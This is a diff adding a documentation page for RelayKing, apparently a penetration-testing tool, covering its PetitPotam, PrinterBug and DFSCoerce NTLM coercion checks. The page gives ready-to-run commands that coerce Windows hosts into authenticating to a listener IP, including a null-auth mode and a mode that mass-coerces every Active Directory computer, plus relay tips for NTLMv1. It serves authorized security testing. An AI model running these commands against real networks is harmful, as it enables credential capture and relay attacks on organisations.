@@ -1,0 +1,126 @@
+---
+title: "Coercion vulnerability detection"
+description: "RelayKing actively tests for PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), and DFSCoerce (MS-DFSNM) coercion vulnerabilities by attempting the exploit and checking for a callback."
+---
+
+Authentication coercion attacks force a Windows host to initiate an NTLM authentication to an attacker-controlled listener. The resulting authentication can be relayed to another service, used for credential cracking, or captured for offline analysis. RelayKing can actively test for three coercion primitives and optionally trigger them against all hosts in the domain.
+
+## Enabling coercion checks
+
+Coercion detection is **not** enabled by default. You must supply `--coerce` and a listener IP:
+
+```bash
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --dc-ip 10.0.0.1 --audit \
+  --protocols smb,ldap,ldaps \
+  --coerce --coerce-target 10.0.0.99 \
+  -o plaintext --proto-portscan
+```
+
+`--coerce-target` is the IP address of your listener (e.g., a host running Responder or ntlmrelayx). RelayKing will send coercion attempts pointing to that IP.
+
+## Three coercion techniques
+
+### PetitPotam (MS-EFSRPC)
+
+PetitPotam abuses the Encrypting File System RPC interface to force a host to authenticate outbound. It is notable for working **without credentials** (null auth) against unpatched hosts.
+
+| Property | Value |
+|---|---|
+| Protocol | MS-EFSRPC |
+| Pipes tested | `\pipe\efsrpc`, `\pipe\lsarpc`, `\pipe\samr`, `\pipe\lsass`, `\pipe\netlogon` |
+| Null auth | Yes — works without credentials on unpatched hosts |
+| Methods tested | `EfsRpcAddUsersToFile`, `EfsRpcAddUsersToFileEx`, `EfsRpcDecryptFileSrv`, `EfsRpcEncryptFileSrv`, `EfsRpcOpenFileRaw` |
+
+### PrinterBug (MS-RPRN / SpoolService)
+
+PrinterBug abuses the Print Spooler RPC interface. It requires credentials to trigger but works against most Windows hosts that have the Print Spooler service running.
+
+| Property | Value |
+|---|---|
+| Protocol | MS-RPRN |
+| Pipes tested | `\pipe\spoolss`, dynamic endpoint via port 135 |
+| Null auth | No — credentials required |
+| Methods tested | `RpcRemoteFindFirstPrinterChangeNotificationEx` |
+
+### DFSCoerce (MS-DFSNM)
+
+DFSCoerce abuses the Distributed File System Namespace Management protocol. Like PetitPotam, it can work **without credentials** against hosts where the DFS service is running.
+
+| Property | Value |
+|---|---|
+| Protocol | MS-DFSNM |
+| Pipe | `\pipe\netdfs` |
+| Null auth | Yes — works without credentials |
+| Methods tested | `NetrDfsAddRootTarget`, `NetrDfsRemoveRootTarget` |
+
+## Null auth coercion
+
+PetitPotam and DFSCoerce can be attempted without credentials using `--null-auth`. This is particularly useful for identifying unauthenticated coercion paths — if a host is coercible via null auth, it is a critical pre-authentication attack vector:
+
+```bash
+python3 relayking.py --null-auth -vv \
+  --protocols smb --coerce \
+  --coerce-target 10.0.0.99 \
+  -o plaintext 10.0.0.0/24
+```
+
+<Note>
+Coercion is only reported as a **vulnerability** when `--null-auth` is used. With credentials, coercion is expected to succeed and is shown at verbose levels only — it is not treated as a finding.
+</Note>
+
+## Coercion timeout
+
+Each coercion attempt waits for a response up to the configured timeout before moving on:
+
+```bash
+# Set a 5-second timeout per coercion attempt
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --coerce --coerce-target 10.0.0.99 \
+  --coerce-timeout 5 -o plaintext TARGET_HOST
+```
+
+The default timeout is **3 seconds** (`--coerce-timeout 3`).
+
+## Mass coercion with --coerce-all
+
+<Warning>
+`--coerce-all` attempts coercion against **every computer account in Active Directory**. This generates a large volume of RPC traffic and will almost certainly be detected by EDR, SIEM, and network monitoring. Do not use this on engagements where detection is a concern.
+</Warning>
+
+`--coerce-all` enumerates all AD computer accounts and coerces them in sequence. It requires credentials and cannot be combined with `--audit`:
+
+```bash
+# Mass-coerce all AD computers (extremely heavy)
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --dc-ip 10.0.0.1 \
+  --coerce-all --coerce-target 10.0.0.99 \
+  -o plaintext
+```
+
+Mass coercion is most effective when combined with NTLMv1 being enabled in the environment. If the domain uses NTLMv1 (`LmCompatibilityLevel <= 2`), coerced authentications can be cross-protocol relayed to LDAP regardless of signing configuration.
+
+## Combined audit and coercion
+
+Supplying `--audit` and `--coerce` together performs a full protocol audit **and** coercion testing in a single pass:
+
+```bash
+python3 relayking.py -u lowpriv -p 'P@ssw0rd' -d corp.local \
+  --dc-ip 10.0.0.1 -vv --audit \
+  --protocols smb,ldap,ldaps,mssql,http,https \
+  --threads 10 \
+  --coerce --coerce-target 10.0.0.99 \
+  -o plaintext,json --output-file relayking-scan \
+  --proto-portscan
+```
+
+This is the recommended approach for engagements where coercion enumeration is in scope — it avoids running the tool twice and correlates coercion results with protocol relay findings in the same report.
+
+## Flag reference
+
+| Flag | Description |
+|---|---|
+| `--coerce` | Enable coercion vulnerability detection (requires `--coerce-target`) |
+| `--coerce-target <IP>` | Listener IP that receives coercion callbacks |
+| `--coerce-timeout <seconds>` | Per-attempt timeout (default: 3) |
+| `--coerce-all` | Coerce every AD computer account (requires creds, cannot combine with `--audit`) |
